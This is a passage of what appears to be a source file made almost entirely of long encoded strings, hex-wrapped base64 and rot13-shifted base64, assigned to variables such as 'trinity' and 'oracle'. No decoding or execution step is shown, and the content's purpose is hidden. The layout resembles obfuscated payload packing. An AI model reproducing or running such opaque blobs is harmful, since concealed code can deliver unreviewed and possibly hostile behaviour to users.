GE1OTc3NjY1OTVhMzQ0NzM5NTk1MDY2Nzc1NTM4Njc1ODY2Njg1MDdhNjY2NTY5NGYyZjQzNzIzNjQ0MmY1MzY4NzM1MTM5Nzc0MjUwNTE2MTQ0MmY1YTJiNmY2YTc4Njc3MDc3NDg3NzRhNGYzMTc4NDQ2NjM2NDUzNzM0NDM1NDRiNjQ2MTQyNTQ0MjY1NDM2NTc3NWEzMjUyNzc3NzM4NTU0NTM0NzQzNzQ5NjI3OTM3NTM2NzZlMzg0NjZlMzE2NjcwNjE0NDM3Njg0YzM3NmI2ZTJmNjk0NDJiNTIzMzc5NzI0MjRmNTI3NjMyNDE1NDJiNjc3MjY5NGYzMDY1NTQzNDMzNjQzNjc4NTg3MjMwNGMzNTUzMmI1MTM3MzI1MTRjMzQ0YjMwNTY1MDU3NTU1MzJmNTk0ZTc3NTU0ZjU2NTA1MjQ0MmI1YTM3NzI1NzYyNTI1MDc5NmI0NDczNzU0OTRmMmI1MDQyMmYzMjZhMmYzMDcwNmUzMTRlNGQzMjc3NTg2NjJiNWE0ODJiNGM2ZTY4Mzg2ZjZlMmY0Njc2NjQzMDQ0NDQzNjQxMmY2NTMwNDUzOTUxMmIzNDM1Mzc0YTYyMzA3YTY1NmIzMzM5NDQ1MDc4NjUzOTZmMzcyZjVhNDMyZjc4NDE0Zjc1MmIzNDU2NzY3NzQ1Mzc1OTcwMzkzMjJmNjUzNDQyNGQ1OTUwNjY0MTRmNjQ2YTRhNmY0ZDY0NTA3OTY4NjQzNDUxMzM3NzQyNjI2ODQ3NTA0OTQzNjY2MTMyMzU0MzU5NGY3MTY2Mzg0MTc1NmY0Njc1NDU0YTRkNmY1Njc3NzIzMDcwNGY2NjZmNDI2NjQ5Njc1ODRiNmI3YTU5NDM1MDQ0NzY2MTQ0NTgzOTQzNDgzOTU3NDE3NjcxNTM0YjJmMmI0NjRmMzA3NTc5NDgzODQ1NzY3NTQyNzY3ODUyMzI2Yjc4NGE2NjczMzEzNDRmNGI2NTRiNTk3ODQxNzQ0ZTJiMzc0NzQ1NjI3NjY3NDYzOTU5NjgzOTZhNmY3ODQ4Mzk0YTQ3NjU1MDM4NTkzNTczNTY0ZTY5NzE1MzRkNTk2ODUwNzY0MTc2NGM2MTU4NTg3OTQ4MzQ2MTQ1MzY2NzU3MmI0YzZmNjk3NjM3NTAyZjYzNDY2NjUxNTQ3NTQyMmY1MDY3NGM1MDZiMzY2MTM4NTE1MjcyNzgzNzUzNTA0YTJmNjE0NjQ4NzI0ZDY1NTgyYjZjMzM2ZjY4NzUyYjY4MzczMDM4MzI2OTRlMzk0MzZlMzg1NjM4NTk0ZDM0Nzc3YTY5NDg2MTJmNDI0ODM3NGQ1MjMzNzc0NTUwNmY0MTM3Njc3MTJmNmM0Yjc0MzY0ZDJiNzUzNDQ4NjM0Yjc2NDU3NTRhMzM3ODZlNmM2NzY2MzE2ODU0NzgzMzZhNDQ0ODQzMzQzODMzNzM2MzQyNmYzNjQ5MzM0Yjc0NGQ1OTcyMmY2NzYxNTI2MzU0NTIzNDZkNmUzOTQ3NjY3NTMwNjY0ZjU2NzI2ODY3MmY3OTVhNjM2YzY2Njc3NTJmNmY2ODM1Njc0Mjc3MmY2MTc2NjM2OTc4Njc3Njc5NDk0ZDMxMmIzNDVhNDI2OTc2NmY1ODYzMzg0YTdhMzU2ODc2MzU2YTc4Njk3NTc2NTQ2NjZmNjY2OTcwMzUzNzZmMzEzNjRiNzUzNDUyMmI0ZDc4MmY0MjM5MzY0YTUwNzg3MDcwNGMzNDUyNTQ3NTdhNjE0NjZkMzA3YTM5Nzc2YTZlNmM1MDZlNzM0Mzc2NTE0ZDc5NjY0ZjY0NGM1MTYyNzk3MDc0MzU0Mjc2MzE3OTc4NjI3NzQ0Mzc3OTZhNzc0MjM3MmY2ZjU5N2E1ODZmMzg0MjZlNjY1MzM2MzQ2ZTUwNjk0MjU5NDQ2NjM0Mzk3ODc2NmQ1NjMyNGU2ZDYzNjM1MTRjMzQ0MzU4NmQ0MzUwMzg1MjRmMzQ3MjRhNjc0YTY2NmI2OTc2NjM0MTc0MzI2NzY2Nzg1Mzc2NWE2YTMzNGU0Nzc3NTQzMzM0NDg2NTU0NDI1MDQ1NTA2ZTUzNTQzMjZlMzM3MTc5NjYzOTUyMmY3NzY1NjU2ZjU1NjQ0NDQ4NzUzNTRkNGQzNDU3NzQ0NTc2NTE3MDY1NDg3NjczNDU3Njc1NzkyYjJiNTk1ODMwNmIzODQyNjMzNjY2NTk0OTJiNTY1NDdhNzc0MzY2Mzg1MjUzNTg0NTUwMmI1NzRmNjY1YTc4MzQ2NTYzNjU3MTVhNjQ3NzU2MzY1NTc4NDM3NjczNzgyZjdhNGQ2ZjcyNzk2ODYyMzc3NTUwNjEzNDc5MzM2NjY4Mzg1MDQ1NjY3NTUyNzgzNDY5Mzk1YTQzNmU3ODczNjI0MTU5MzkzNjQ2MzczNDQyNDIzMTQ0NTQ3YTZlNzY2ODM3Nzg0ODU4NTE0Njc4Njg1NzYzNTk2NjM3NDg1ODQxNzMzNDU0NzA3NzUzNTA3ODRlNjQ1MTQxMzU2NjJiNTUzOTQ3NjU1ODY4NjM0NjJmNmI0NzYzNDk0NDc4NmE2Njc3NzYzNjQ0NzM2ZTM1NmUyYjMwNmQ3NzUwNzc0NTQ4NTE2NzU4MmI0ODY1N2E0MTM4NmI3NjMwNzg0MjRlMmY0NTVhNjY2ZDMzMzY2NjQxNTQ1MDQ5MzU0NzJmMzU0MTY2NDU2ODVhNTI3OTM0NzY0ZDU2NjM2MjQ1NTQyYjM2NzU1OTRjMzg1YTM5NjY3NDQ1Njg2ZTY3NGIzMzQ1NjMzOTM0NTQ1NDc4Nzc2NTMzNzc0MzcwNmI3MjRmNzg1MDU3NTk1MDc4NDg2NjZkNTUzODQxNTYzNTY5NjY0ZDYxNjY2MjJiNGMzMzM5NjU2NzY2NmQ0NzY2NTE0YTM0NmQ0ODVhNzkzMTJmNjk0NzU4NDc1NDYzNTY3MjM0NDUzMzMxMzY2NzZiNDg0ZDUyMzU2YjU4MzQ0YTMyNGQ0ZjRmNjQ0OTUwNzQ2NjU0MmI2MTUyMmYzOTUwNmQ0YzZmNTIzMDM3Njc3NjRmNTM3ODMwNmI2NTU5N2E0NjJmNGQzNTUxNzYzOTYzNWEzODRiNmQ0MjRmNTE3NDc3MzY0ZDRmMzg3MDc5NTI2NjY1NDU3YTc1NTM2NjQ5NmEzNTQ1MmIzMTUxMzQ2ODYyNjk0MzQ3NGE3NzRjNzIzNjRiNTA0YTcwMmI1MjQ0NzY3OTY5NGU0ZjQ5NDgzNDc4NTg0ODZlNGQ1Njc5NGMyYjZhNTgzNDQxNjYzNTY3NTczODM5Njk1MjJmMzQzNjJiMzc2YjRjNjg2NjMwNmMyZjRmNzQ0YzRkNzY2NjM0NGQzODM1NDgzMzQ5Nzg3YTQxNzY2ZjU2MzgyYjZkNDMyZjRlNGE1NTM4NmQzMzYxNDI1ODM4NmQ2MjZkNDkzODc3NmE3NzUyMmY3YTUwNjU2MjM5NmY0ZDJmMzAzODY0NzU1NzJmNGY0NjU1Mzk3NjM3NzY0ODY2NmYzNDQ3NGU0MjY2NmQ0YTM4Nzk0Yzc5NDE0ZjQ1NzgzOTY3NmMzNDc4NjQ2ZTczNTI1ODU2MmY0OTZiNzc1NDMzNmQ0MjQ5NjIzMjM5NTI0NDM3NDY3Mjc1N'
trinity = 'zRlMwH1AQH0MwMwAwH0AQp3AGHlMwD5AGtmAGpjAGL0ZwZ3AQx3ZGL2AmN2Mwp4AwV3AmEwZmN0MGZ5ATH2AQMwAzV3ZGL2ATD0LGLkZmD2AGHmAGNmBGpjATZ2LGLlATH2AGDkAGNmAGMyAGZ1AQp2Awp1AwZlAGZ1AQZ5ATR0LGL1ZzV0MGZ1AwtmZmMwATV1AQHjZmVmBGp5ZmZ2MGD1AQxmZmZmAzV0AGZmAGR1AQMyAmx1AQp2ZmD3AwplAwp3ZQp5AmLmAmp2AQR1AQZlAzD2Amp0AmHlLwL0AGR1ZQZ4AwD0BQp0ZzL1LGp2AzH0AmExAwp0ZwZ1Amt0ZmL1AGp3BGMuZzL0MwL1AGL0AQWzAGH2LmL1Amt1BQp5ZmR3BQquAQt0AQZlAQt2ZwL5AGN3Zmp3Zmp2MQL1AwL0Lmp1AwZ2BGL4AzH3BQp2ATR2BQZmAwtmZwMzAmD3BGDlATRlMwDmZmp1BQHjAmp3ZmIuAzZmAGD5ZzV2BGMwAmLmAQL3ZmZ2BGDlAmL2AGL4AmLmAwZ4AzVmZmL5AQDlLwMwAwZ3AmMuZmD0MwLmATLmBQZ2AwD2ZmZ3ATVlMwDkATZlLwExAwRmBQquAGD2ZGL0AwD1LGZ5ZmV1LGZ4AmVlLwLkZmH1BQD1AGNmBQp0Amx2ZmEyAmN1ZmZ0AQt2LwZ4AwZ1ZwMyZmp2LwZ5ZmL0Mwp1ATV0AGZ2AwLmAwExZmVmBQHmAmL2LGD4AzV0LGZ4Amt0AmL1ZmDmZQL3ATZmAQMuAGN2BGpjAmL0ZGDlAmL1ZmDlZzVmBQMyAmx0ZwHjATV2LGplZmH2ZmDmAGx1AQEwAmZ2BQD4AzD2AwD1AGH2AwpjAQDmAmZkAwH2MGH3AGN0BGZkZmt1Zmp1AwH0MwZjAGp1BQpjAQx0MGp4Awt2MGZ1ATR1ZQH0ATR3AGL5AmDlLwZ3AwL2AQZ0AzVmBQH5AzZlLwquZmZ2BQDmAwL1AQZ3ZmplMwD3Zmt2LmZ1Zmp2AQL1AmL3AwHkAQDmBQZ4AGtlMwpmAmD2ZmWzZmDmAQMyAzL0LGp5AwRlMwp0AmH1ZmEwAzV0LmHjAzV3AGp5AzH3LGExZmD2MQHjAGN0AGZ4Amt3ZwplAzD1ZmEwZzL0BGZ4Amx2Awp5ATR2ZmH2ZzL2BGExZzV1BQHkAzHmAmpmATDlLwLkATD2AQLmA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'
oracle = 'M0ZjY1MzE1OTQzNTY2OTc4MzE1MzQxNmM0YzUzNmE2MzcwNTMzODc2NGM0OTMwNzY2MzcwNmQzOTUyNjQ1NjQ5Nzk2YjUyNDkzMDUzMzM2ZjczNzk2MjRmNmM0YTY5NTcyYjZjNjk1NjY0Nzc3ODRhNTE3OTc0NGE3ODRhNjk1ODU4NmE0NzMwNDg2MTY2MzE0OTY1NjI3MzdhMmY0YTRmNTc1MTc0NDgzMjcyNTE2YjcwNjQzNzQ1NDU2NTcwNzE2ZTYyNGU0Nzc4NGU0ZjRlNjI2MjQ2NmM0YTc1NTUzNzJiMzI0MjcyNmE2NTcyNDg0ZTY0MzY1MjQ2NGM3OTMyNTM3YTRhNGM1NzRhMzUzNTRhNGI1NTcwNGIzNzMzMmY1MzQ4Mzc0ZDQ2NjI1MDU3NmM1OTcyNTk0NDZhNGM1NDJiMzU3OTY0NzA2NTY0Njg1MzQ3NzU0OTM5NjE2NDQ3Nzg0YTYzNjM3OTRjNDU3MzcwNjM2NDM5NGY2YzM1NjI1NDY5NzE1NTY4NzE3ODM4NTA2OTRhMzk2NjcyNjI2OTc2MzE2OTUyNjI0ZjRkNjI0YjU3NDM0YjU3NjM2ODY5NjU2YjMxMzg1YTUwNTc0NDcwNTA1NzY0NGM3OTcwNTk1MzYxNTA3MDZlNzEzODU2NmU2MTY2NTQ0OTU1NmQ3NjRmNmI2OTQyNjI0YzQ3Nzk0NjczNjYzMzQzNjQ1Mzc1MzI2Yjc0Njg3MTZjNGU0YzZhNjc0NzMzMzYyZjQzNTE3NDU3NGM1OTM0NGI0OTY2NGY3MzQzNTM0ODJmNjE1NzQ1Nzk1NjQ1NDQ3NDZmNDE3MDY0MzU2MTczNGU2YTM3NmI0OTcxMzA1NzM3NGU0ZjU4NzY3MTU1NDY3NjMyNDc0YTZiNGM0YzU0MzU0ZjJmNGE1NjcxNGY1MjQ2NzE0YjU3NTU3MTMxNjg3OTc3MzUzNjM1Njc2YTQ3Njc2OTU4NmU0YzcwNWE1NzcyMzc1MTQ5NTc0ZDcwNmI2OTU1NzQ0YjYyNGM3OTQ4NjY2NjQ1NzM2YzJmNDU0ZDMzMzU0YTUzNTc1MzQzNzQyYjZmNjU1NTMzNmE3MjcxNGM3ODU5MmI3MzU0Mzc2MjRhNmM0YjUzNmQ2Yjc0NGM2ODRiNTg2OTJmNDQ1MTJmNTU1MTM5NjM2Yzc5MzM0NzZkNDM1NjUxNzE3OTJiNDQyYjM0MzY1NTM2NzQ2ZDcxNmM3ODU5NGE1Nzc3N2E1Mzc5NmQ0YjRjMzU0ZDc5NTczNjVhNzk2YzMyNDI0ZTYyNTQ3MDQyNjI1MjU4NmQ3OTU2NGQzMzU3NDc1MDZiMzc3NTRlNGE0YjU5NjM3NDQ0NTc2ZjQyNzM3NTVhNDUzMjc0NzY3ODVhNTE2OTc3NzQ1MTMzNmI0NTM1NGM0ZTc2NDMzODc0NmY1MjYyNzE3OTcwNTE1ODQ5NmI2OTcyNzA0MjZhMzM1NTRmMmY2ZTRjNTc2NjRhNmU0YjVhNDE3NDZlNjk3MjcyNTMzNDc5Nzc3MzU5Nzk2YzMyNGE1NDUwNGQzNTYyNmYzMjQ1MzUzNzc5NDg3MjY5NDYzNTZkMzAzMzc2NmYzMjQ2MzA3NTQ4NGM0NzU4NTM0YzMxNjc1NzM1NDMzOTYyNGQ1Njc5NTgzOTczNjI1MzRkNmI2MzMxNjU3Njc1NTY2YzY4NTI0Yzc4Mzk1MzcyNTYyZjUxNzQ1MzYzMmYzMDRhNjY1ODcxNzEzMTU2NjM3MjY2NzE1MzYyNjQyZjY5Mzc2MzUzNGY1NzRhNDk1MDRmNDg2ZjY3NzI2NTMyMmI0NDUzNDc2YTQ4MmY0NjU4NTM3NzMxMzc1NjM1NzE3NDY5NDc1MDY2NDk3NTY4NGM3MDRlNGM0MzRmMzg2YzZmNDM0Zjc5NDM3MjYxNDI0ZDUzNzIzNzUzNjk3MTczMzQzMDczNDM1NzY0NGU3OTMzNDQ3NDZiNzE0YTdhMmI0Mjc0NDYzNTY4NmUzNDcwNzk2NzZjMzI3NzcyNTM0MjJiMzA0OTM4NmU1NTQyMzkzOTUzNWE2NTc0NzI3NjRlNTgzNjY2NjQ0Mjc2NmE0YzUyNGYzMTczNjc3MTM0NDc1NTZlNzI2ZDc1NGEyYjJiNTMyZjM3MzUzMDM3MmY2YTYzNzgzMjQ3NGMzNDU3NzQ1NTc4NzA0NzMxNTA0YTM4NmM3YTRiMzkzMjY2Njk3OTc0NzY1OTc4MmI2NTYxNGM2NDQ2Nzk3ODJmNjM3MDMwNzY1MDU2NDQyZjMxNDI1MDc0MmIzOTQyNGE2OTdhNDg2YzY5NDE3YTYyNTc2MjZmNjY3MTVhNDU1MjQ2NDkzNDZkNWE2MjMwMzgzMjRiNzE1NjM5NmIzMzRkMzE3NTUzNzc2MjdhNTY3ODZjNDk0ODM2MzYzMTc1NmI2ODcxNGQyZjU5NmE2NjQxNmEzNDQ0NTk2NzZkNzQ2OTY4NzI1NDQxMzI1MDM1Njc3MTMxNzYyYjQ0NTgyYjRmNDI1OTY0NDU0NjM5NGE2MTc5NzYzNDYzNjI1NzRjNGMzMjYxNDY2NDY5NGI3OTZjNDI1NTc1NGQ1OTRjNzQ3MjRhNTM0ZDMyNDMzNzU5NGY1MTQyMmY3NDZjNDczMDZmNmI1NzY1Njc3MDU0NTU0NDc1MmI3NDQ4NDM2ZjY4MzE1OTY5NjUyYjZhNGMzNTQxNzY2ZDc5MzU0NDQ4NzYzNjY1NzIyZjZmNTIzMDVhNmY2ODM5NGI3OTJmNjM2YzZlNTI3NjZmNDM3NDcxNGI0NjU4NzI1YTQxNDIzOTQ5MzY1MzRiNDU1ODJiNzA0NzMwNGM0YjU1NTY0OTc5NTY3MDRiNTgzMjdhNjQ2NTMzNmM2ZjcyMzk0ZDU3NmY3MDY2NGY0ZjUzNzgzNTYyNDQ3MTc5Mzk0NjcwNjYzOTMyMzM3YTZkNGE3MDQ5NjQ0ZjY2NzA0NTU4NDE2MzUyNjY2MTQ3MzI2YjUzNzUyYjRkMzczMjQ2NzQ0NzU4NjQ2ODcxNmM2NDQ3NTU1OTU3Mzk1ODRmNTU2MzRlNzI0YzJmNDQ0ZTM5NDQ0NDU2Njg0MjQ4NmY2MjM1NDc3MjZkNjczMzMwNzI0OTZkNDQ2ZTUwNDU1MjRjNDI2MTMyNzI3OTZiNmUzNjMyNjI2ODY1NDE3NTRkNTk1MTZhNGQ2ZDc3NjgzMDZlNjY1OTM0NzE0ZjczNTkzODQ1NDg1MTdhNzQ2ZTM2MzA1NjQ3NDI3ODY3NTA1MjQ1NjU2NDc0NGY1MjZjMzk0NzZiNmM2NjZiNDc2MzZlNTA2Mzc0NGY0YzYyNmQ0ODc0NGM3MTZiNzI2YTc3MzE2MTRjMzEzNjQzMmI2YjU4MzA2MTZhNmY0NjUwNjk0NDY2NDY0NjYzNjM1MjZkMzA0OTM4NjM1NTVhMzg2MzUyNTk0YjJmNTY1Nzc3NzY3MzU2NTc3YTJiNmQ3MTRhNmM2ZjM2MzA1ODQ0NjI1MzMwNmU0MjM2MzM0ZjUwNmY0NzZjNzQ1NDZjNDYzMTQyMzM0YTU2NTcyYjZmNGI3OTRhNGQzNTMzNTAzNjUyNDY0YzUzMzI0ZDY3NDM0ZDQ0NjI0YTJmNDczNDRhMmY3OTVhNmE3YTZkNTM0YTc5MzAzMDQ0NzQ3MDcxNTg1MjVhNGEzMzZhNGMzMDUxNTc0ZjQ2NmU1ODM1Njk1NDYyNTI2YTM0MzczNTY2NjM3NDRkMmY0ODM1NmM3OTM2Njc2MTUyN2E0YjQxMzczNDc1MzA0ODMyNTU3OTY3NzI2MzQ4NDc2NDZiN2E2MzY3MzAzNTMwNmUzOTZiNDI0MTc2MzA3OTQzNjg0MTUzNjI3NTMzNWE0NDJmNjUzOTM5NmE0MzQ2NDYzMTdhNmM0NTY0Nzc3MTUwNjM1NDZhNmQ2YTUxNjYzMzcxNjM2YzY1MzgzNzMwNzAzMzMxNzI1Nzc5NGY1NjZiNmU2MzM5Mzc3MzJiNTA3MTdhNjM3Mjc4NWE3MDMyMzQyZjczMzA1MDM3NmE3NjZhNTg0NzY2NTM3MTRmNzA2ZTdhNW